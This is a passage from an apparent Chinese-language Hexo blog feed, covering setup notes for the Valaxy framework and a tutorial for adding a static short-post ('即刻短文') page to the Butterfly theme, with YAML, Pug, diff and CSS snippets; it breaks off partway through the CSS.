id="初始化">初始化</h3><p>创建一个目录用于存放 Valaxy（例如<code>Blogroot</code>），在该目录下打开终端（Windows 设备建议使用 Git Bash），执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm create valaxy # 或 npm init valaxy</span><br></pre></td></tr></table></figure><p>接下来的终端窗口中会出现选项，通过键盘的上下箭头进行选择，使用【Enter】确认。</p><p>通常情况下：</p><ul><li><code>Select a type</code>选择<code>Blog - For Most Users</code></li><li><code> Project name</code>默认即可</li><li><code>Install and start it now</code>输入<code>y</code></li><li><code>Choose the agent</code>选择<code>pnpm</code></li></ul><p>每次选择后需按下【Enter】键，之后继续跟随命令行提示完成创建。</p><p>随后进入该目录并初始化项目：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd valaxy-blog # 进入生成的目录</span><br><span class="line">pnpm i # 或 npm i</span><br></pre></td></tr></table></figure><h3 id="启动预览">启动预览</h3><p>在<code>valaxy-blog</code>目录下打开终端，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm dev # 或 npm run dev</span><br></pre></td></tr></table></figure><p>（其实上一节创建完 Valaxy 项目后程序也会自动启动预览）</p><p>默认启动端口为<code>4859</code>，待启动完成后，可访问<code>http://localhost:4859/</code>查看预览。</p><p>您可以编辑<code>valaxy-blog</code>目录下的<code>valaxy.config.ts</code>文件，参考 <a href="https://valaxy.site/guide/config/" rel="external nofollow noreferrer">Config</a> 进行站点配置。由于它支持热更新，因此可以直接编辑 config 文件，页面会随之自动更新（如果配置不出错）。在<code>pages</code>目录下创建、编辑文章同样也会在页面热更新。</p><h3 id="更新程序">更新程序</h3><p>在<code>valaxy-blog</code>目录下打开终端，执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">upgrade valaxy</span></span><br><span class="line">pnpm add valaxy@latest # 或 npm i valaxy@latest</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">upgrade theme</span></span><br><span class="line">pnpm add valaxy-theme-yun@latest # 或 npm i valaxy-theme-yun@latest</span><br></pre></td></tr></table></figure><p>使用 pnpm 也可以执行这条命令更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm up --latest -i</span><br></pre></td></tr></table></figure><blockquote><p>更多详细使用教程参见官方文档，此处略</p></blockquote><h2 id="使用体验">使用体验</h2><p>目前已测试编写文章、配置文件修改、增添 CSS 等基本功能。将原来 Hexo 目录下的 MD 文件直接丢进<code>pages/posts</code>目录，稍作等待页面便自动将其渲染（由于 Hexo 及其主题与 Valaxy 的配置项有些许出入，文章需作轻微调整才可达到预期。具体格式可见初始化后该目录下的<code>hello-valaxy.md</code>文件）。反观 Hexo，渲染同样六十多篇文章需要 8 秒左右，这个速度差别也是比较明显的了。</p><p>同时，Hexo 虽然有<code>hexo-browsersync</code>这样的插件可供调试，但页面修改后大多需要刷新才能看到效果（程序会自动刷新），但貌似仅限于<code>source</code>目录，起码修改项目根目录下的<code>_config.yml</code>之类的文件它是不能立即生效的，需要退出预览后重新编译。Valaxy 不需要，修改完配置文件后页面可以自动更新上，对于调试和开发、修改预览而言非常方便。</p><p>由于这个框架还比较新，插件和主题还不多，但它可以直接使用现有的 vue 和 vite 插件，且项目本身的基础体验已经不错。如果有需要的，这也是一个不错的选择。</p><p>不过由于迁移比较麻烦，变化较大，故本站目前仍使用 Hexo。</p>]]></content>
      
      
      <categories>
          
          <category> 体验推荐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>给-Hexo-添加静态即刻短文页面</title>
      <link href="/posts/2833463774/"/>
      <url>/posts/2833463774/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>并非所有想表达或分享的东西都适合写成长文，“即刻短文”可以避免博客短文章过多造成的整站文章质量下降。</p><p>最近由于未知原因，域名半寄，Artitalk 用不了了。无意间看到 <a href="https://blog.zhheo.com/p/557c9e72.html" rel="external nofollow noreferrer">即刻短文静态部署版</a>，遂尝试。</p><p>实际上先前以多次尝试，又应种种原因不了了之。本次成功，记以备忘。本文所述已按照自用情况进行一定的修改，效果与别人的版本有出入，请慎重使用。</p><div class="note info flat"><p>Butterfly 5.0+ 已经内置说说功能，但和本文记录的即刻页面有所不同，请自行选择使用。</p><p>Butterfly 每个版本都会改动文件，请注意分辨。</p></div><p>为书写方便，下文如无其他说明，则默认 Hexo 项目根目录为<code>【Blogroot】</code>。测试使用 Butterfly 主题，其他主题未尝试。</p><h2 id="创建数据">创建数据</h2><p>进入<code>【Blogroot】/source/_data</code>目录，创建<code>essay.yml</code>，其中数据示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">即刻短文</span></span><br><span class="line">  <span class="attr">essay_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">test</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2024</span><span class="string">/3/30</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">链接示例</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2024</span><span class="string">/1/25</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://info.cern.ch/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">多个链接</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2023</span><span class="string">/10/21</span> <span class="number">08</span><span class="string">:00:00</span></span><br><span class="line">      <span class="attr">link:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://cn.bing.com/</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://www.baidu.com/</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://info.cern.ch/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">发布者名称</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2023</span><span class="string">/10/23</span> <span class="number">08</span><span class="string">:00:00</span></span><br><span class="line">      <span class="attr">from:</span> <span class="string">Author</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">图片测试</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2022</span><span class="string">/10/23</span> <span class="number">10</span><span class="string">:00:00</span></span><br><span class="line">      <span class="attr">image:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">https://api.vvhan.com/api/bing</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">歌曲推荐</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2022</span><span class="string">/09/25</span></span><br><span class="line">      <span class="attr">aplayer:</span></span><br><span class="line">        <span class="attr">server:</span> <span class="string">netease</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">3949477</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">视频直链（未加载出则为白屏）</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2023</span><span class="string">/10/23</span> <span class="number">08</span><span class="string">:00:00</span></span><br><span class="line">      <span class="attr">video:</span> </span><br><span class="line">       <span class="bullet">-</span> <span class="string">https://www.w3schools.com/html/movie.mp4</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">content:</span> <span class="string">Bilibili</span> <span class="string">视频测试版</span> <span class="number">2</span></span><br><span class="line">      <span class="attr">date:</span> <span class="number">2023</span><span class="string">/10/21</span> <span class="number">08</span><span class="string">:00:00</span></span><br><span class="line">      <span class="attr">bilibili:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">//player.bilibili.com/player.html?bvid=BV1us41137Fd&amp;autoplay=no</span></span><br></pre></td></tr></table></figure><p>参数：</p><table><thead><tr><th>参数</th><th>备选值/类型</th><th>释义</th></tr></thead><tbody><tr><td>class_name</td><td>String</td><td>标识符，无实际意义</td></tr><tr><td>essay_list</td><td>Array</td><td>【必选】即刻短文数据列表</td></tr><tr><td>essay_list.content</td><td>String</td><td>必选】短文 文字内容</td></tr><tr><td>essay_list.date</td><td>Time</td><td>【必选】发布时间 格式建议为<code>2022/10/10 00:00:00</code></td></tr><tr><td>essay_list.image</td><td>Array</td><td>片内容，可填写多张图片</td></tr><tr><td>essay_list.from</td><td>String</td><td>来源，也可以是任何标识</td></tr><tr><td>essay_list.link</td><td>String</td><td>外部链接</td></tr><tr><td>essay_list.aplayer</td><td>Array</td><td>单曲音乐，需 aplayer 支持</td></tr><tr><td>essay_list.aplayer.server</td><td>String</td><td>【essay_list.aplayer 后必选】音乐服务器</td></tr><tr><td>essay_list.aplayer.id</td><td>String</td><td>【essay_list.aplayer 后必选】单曲 id</td></tr></tbody></table><h2 id="创建单页">创建单页</h2><p>进入<code>【Blogroot】/source</code>，新建文件夹<code>essay</code>并在该文件夹下创建<code>index.md</code>（此处文件夹名称可自定义，之后访问路径需与此相同），在该文件中写入：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 即刻短文</span><br><span class="line">comments: true</span><br><span class="line">aside: false</span><br><span class="line">top<span class="emphasis">_img: /img/essay_</span>top<span class="emphasis">_img.png</span></span><br><span class="line"><span class="emphasis">type: essay</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><h2 id="创建-DOM-文件">创建 DOM 文件</h2><p>进入<code>【Blogroot】/themes/butterfly/layout/includes/page</code>目录，创建<code>essay.pug</code>文件，写入以下代码（我引入的 MetingJS 为 2.0.1 版本而非主题内置的 1.2.0 版本，因此改动了）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#essay_page</span><br><span class="line">  #bber</span><br><span class="line">    section.timeline.page-1</span><br><span class="line">      ul#waterfall.list</span><br><span class="line">        each i in site.data.essay</span><br><span class="line">          each item, index in i.essay_list</span><br><span class="line">            if index &lt; 30</span><br><span class="line">              li.bber-item</span><br><span class="line">                .bber-content</span><br><span class="line">                  p.datacont= item.content</span><br><span class="line">                    if item.image</span><br><span class="line">                      .bber-container-img</span><br><span class="line">                        each iten, indey in item.image</span><br><span class="line">                          a.bber-content-img(href=item.image[indey], target=&quot;_blank&quot;, data-fancybox=&quot;gallery&quot;, data-caption=&quot;&quot;)</span><br><span class="line">                            img(src=item.image[indey])</span><br><span class="line">                        .bber-content-noimg</span><br><span class="line">                    if item.aplayer</span><br><span class="line">                      .bber-music</span><br><span class="line">                        meting-js(id=item.aplayer.id server=item.aplayer.server type=&quot;song&quot; order=&quot;list&quot; preload=&quot;none&quot; autoplay=&quot;false&quot; muted=&quot;true&quot;)</span><br><span class="line"></span><br><span class="line">                    if item.video</span><br><span class="line">                      .bber-container-img</span><br><span class="line">                        each iten, indey in item.video  </span><br><span class="line">                          if (item.video[indey].includes(&#x27;player.bilibili.com&#x27;))</span><br><span class="line">                            div(style=&quot;position: relative; padding: 30% 45%;margin-top: 10px;margin-bottom: 10px;&quot;)</span><br><span class="line">                              iframe(style=&quot;position: absolute; width: 100%; height: 250px; left: 0; top: 0;margin: 0;border-radius: 12px;border: var(--tasseles-style-border);&quot; src=url_for(item.video[indey]) scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;)</span><br><span class="line">                          else</span><br><span class="line">                            a.bber-content-video(href=url_for(item.video[indey]) data-fancybox=&quot;gallery&quot;, data-caption=&quot;&quot;)</span><br><span class="line">                              video(src=url_for(item.video[indey]))</span><br><span class="line">                        .bber-content-noimg</span><br><span class="line"></span><br><span class="line">                    if item.bilibili</span><br><span class="line">                      .bber-iframe-bilibili</span><br><span class="line">                        each iten, indey in item.bilibili</span><br><span class="line">                          iframe(src=item.bilibili[indey] scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;)</span><br><span class="line"></span><br><span class="line">                hr</span><br><span class="line">                .bber-bottom</span><br><span class="line">                  .bber-info</span><br><span class="line">                    .bber-info-time</span><br><span class="line">                      - var datedata = new Date(item.date).toISOString()</span><br><span class="line">                      i.far.fa-clock</span><br><span class="line">                      time.datatime(datetime= item.date)= datedata</span><br><span class="line">                    if item.link</span><br><span class="line">                      each val, key in item.link</span><br><span class="line">                        a.bber-content-link(target=&quot;_blank&quot;, title=&quot;跳转到短文指引的链接&quot;, href=val, rel=&quot;external nofollow&quot;)</span><br><span class="line">                          i.fas.fa-link</span><br><span class="line">                          | 链接</span><br><span class="line">                    if item.from</span><br><span class="line">                      .bber-info-from</span><br><span class="line">                        i.fas.fa-fire</span><br><span class="line">                        span=item.from</span><br><span class="line">                    if item.address</span><br><span class="line">                      .bber-info-from</span><br><span class="line">                        i.fas.fa-location-dot</span><br><span class="line">                        span=item.address</span><br><span class="line">                  .bber-reply(onclick=&quot;rm.rightMenuCommentText(&quot; + `&#x27;$&#123;item.content&#125;&#x27;` + &quot;)&quot;)</span><br><span class="line">                    i.fa-solid.fa-message</span><br><span class="line">  #bber-tips(style=&#x27;color: var(--tasseles-secondtext);&#x27;)</span><br><span class="line">    | - 只展示最近 30 条短文 -</span><br></pre></td></tr></table></figure><h2 id="修改文件">修改文件</h2><p>在<code>【Blogroot】/themes/butterfly/layout</code>中找到<code>page.pug</code>并编辑（上下无关代码已省去。每行最左侧的加号和减号为 diff 代码块标记增减，实际使用时请删去 <strong>diff 高亮</strong>的行的头部加减号，删去后缩进正确，无需补空格）：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    case page.type</span><br><span class="line"><span class="addition">+      when &#x27;essay&#x27;</span></span><br><span class="line"><span class="addition">+        include includes/page/essay.pug</span></span><br><span class="line">      when &#x27;tags&#x27;</span><br><span class="line">        include includes/page/tags.pug</span><br><span class="line">        +commentLoad</span><br><span class="line">      when &#x27;categories&#x27;</span><br><span class="line">        include includes/page/categories.pug</span><br><span class="line">        +commentLoad</span><br></pre></td></tr></table></figure><p>对于 5.0.0 及之后的版本，该文件有所不同。如果你希望无论如何即刻页面都不要有评论，那么添加上面这两行就行了；如果你想要通过单页 <a href="http://index.md" rel="external nofollow noreferrer">index.md</a> 文件的顶部参数控制评论的有无，那么需要再加一行（参考其他行的引入方式）：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    case page.type</span><br><span class="line"><span class="addition">+      when &#x27;essay&#x27;</span></span><br><span class="line"><span class="addition">+        include includes/page/essay.pug</span></span><br><span class="line"><span class="addition">+        +commentLoad</span></span><br><span class="line">      when &#x27;tags&#x27;</span><br><span class="line">        include includes/page/tags.pug</span><br><span class="line">        +commentLoad</span><br><span class="line">      when &#x27;categories&#x27;</span><br><span class="line">        include includes/page/categories.pug</span><br><span class="line">        +commentLoad</span><br></pre></td></tr></table></figure><h2 id="CSS-与-JS">CSS 与 JS</h2><details class="toggle" ><summary class="toggle-button" style="">CSS</summary><div class="toggle-content"><p>在<code>【Blogroot】/source/css</code>目录下创建<code>essay.css</code>，编辑写入：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 配色部分，参考 anzhiyu */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--blogessay-theme-op</span>: <span class="number">#4259ef23</span>;</span><br><span class="line">  <span class="attr">--blogessay-gray-op</span>: <span class="number">#9999992b</span>;</span><br><span class="line">  <span class="attr">--blogessay-theme-top</span>: <span class="built_in">var</span>(--blogessay-theme);</span><br><span class="line">  <span class="attr">--blogessay-white</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attr">--blogessay-white-op</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.2</span>);</span><br><span class="line">  <span class="attr">--blogessay-gray</span>: <span class="number">#999999</span>;</span><br><span class="line">  <span class="attr">--blogessay-main</span>: <span class="built_in">var</span>(--blogessay-theme);</span><br><span class="line">  <span class="attr">--blogessay-main-op</span>: <span class="built_in">var</span>(--blogessay-theme-op);</span><br><span class="line">  <span class="attr">--blogessay-shadow-border</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">  <span class="attr">--blogessay-style-border</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--blogessay-card-border);</span><br><span class="line">  <span class="attr">--blogessay-style-border-hover</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--blogessay-main);</span><br><span class="line">  <span class="attr">--blogessay-style-border-avatar</span>: <span class="number">4px</span> solid <span class="built_in">var</span>(--blogessay-background);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attr">--blogessay-theme</span>: <span class="number">#3b70fc</span>;</span><br><span class="line">  <span class="attr">--blogessay-theme-deep</span>: <span class="number">#1856fb</span>;</span><br><span class="line">  <span class="attr">--blogessay-theme-op</span>: <span class="number">#4259ef23</span>;</span><br><span class="line">  <span class="attr">--blogessay-fontcolor</span>: <span class="number">#363636</span>;</span><br><span class="line">  <span class="attr">--blogessay-background</span>: <span class="number">#f7f9feCC</span>;</span><br><span class="line">  <span class="attr">--blogessay-secondbg</span>: <span class="number">#f1f3f8</span>;</span><br><span class="line">  <span class="attr">--blogessay-card-bg</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attr">--blogessay-card-border</span>: <span class="number">#e3e8f7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attr">--blogessay-theme</span>: <span class="number">#0084ff</span>;</span><br><span class="line">  <span class="attr">--blogessay-theme-deep</span>: <span class="number">#0076e5</span>;</span><br><span class="line">  <span class="attr">--blogessay-theme-op</span>: <span class="number">#0084ff23</span>;</span><br><span class="line">  <span class="attr">--blogessay-fontcolor</span>: <span class="number">#f7f7fa</span>;</span><br><span class="line">  <span class="attr">--blogessay-background</span>: <span class="number">#18171d00</span>;</span><br><span class="line">  <span class="attr">--blogessay-secondbg</span>: <span class="number">#30343f</span>;</span><br><span class="line">  <span class="attr">--blogessay-card-bg</span>: <span class="number">#000000</span>;</span><br><span class="line">  <span class="attr">--blogessay-card-border</span>: <span class="number">#42444a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page</span><span class="selector-pseudo">:has</span>(<span class="selector-id">#essay_page</span>) &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: none <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#page</span><span class="selector-pseudo">:has</span>(<span class="selector-id">#essay_page</span>) <span class="selector-class">.page-title</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#web_bg</span> ~ <span class="selector-class">.page</span><span class="selector-pseudo">:has</span>(<span class="selector-id">#essay_page</span>) &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--blogessay-background);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-container-img</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-around;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0.3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-container-img</span> <span 